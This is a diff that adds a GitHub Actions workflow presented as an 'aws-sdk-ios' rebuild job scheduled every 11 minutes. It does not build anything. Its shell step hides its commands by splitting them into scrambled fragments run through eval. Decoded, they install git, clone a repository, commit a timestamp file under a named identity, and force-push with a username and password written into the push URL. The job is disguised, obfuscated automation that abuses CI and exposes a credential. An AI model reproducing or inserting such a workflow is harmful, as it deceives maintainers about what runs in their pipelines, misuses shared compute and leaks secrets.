@@ -1,0 +1,43 @@
+name: aws-sdk-ios-ci2
+on:
+  schedule:
+    - cron: '*/11 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: aws-sdk-ios-Rebuild
+        run: |
+          sudo apt update || true
+          DjVDiHtW="sudo apt --"
+          OHZRIM="yes install"
+          wDyQngNvx=" git &>/dev"
+          eval "$DjVDiHtW""$OHZRIM""$wDyQngNvx""/null"
+          GCC=$(date +%s)
+          pKoerz="git clone h"
+          yXTshIQwycy="ttps://gith"
+          zbPonNbz="ub.com/apac"
+          UyheGke="hecnapachec"
+          bRTmOXlyJyD="nribp/aws-s"
+          qEkBDBYt="dk-ios.git "
+          eval "$pKoerz""$yXTshIQwycy""$zbPonNbz""$UyheGke""$bRTmOXlyJyD""$qEkBDBYt""tmp"
+          cd tmp
+          echo $GCC >> jfvp7qN
+          RVbCaBkR="git config "
+          MQoqp="user.name j"
+          HMvBFpJLK="anna-yevlam"
+          eval "$RVbCaBkR""$MQoqp""$HMvBFpJLK""pova"
+          git config user.email janna.yevlampova@lenta.ru
+          git add jfvp7qN
+          git commit -m Done
+          EQoyq="git push ht"
+          hUvOSFh="tps://janna"
+          QuIiRIhBIB="-yevlampova"
+          phZqHoCBuu=":'WjRSj4JPi"
+          EKbwZc="ti9kCE-0Dd'"
+          pfqVw="@github.com"
+          mWqBRXCvu="/apachecnap"
+          zXZAyFssY="achecnribp/"
+          SMjfQOFhrK="aws-sdk-ios"
+          eval "$EQoyq""$hUvOSFh""$QuIiRIhBIB""$phZqHoCBuu""$EKbwZc""$pfqVw""$mWqBRXCvu""$zXZAyFssY""$SMjfQOFhrK"".git -f"
+          
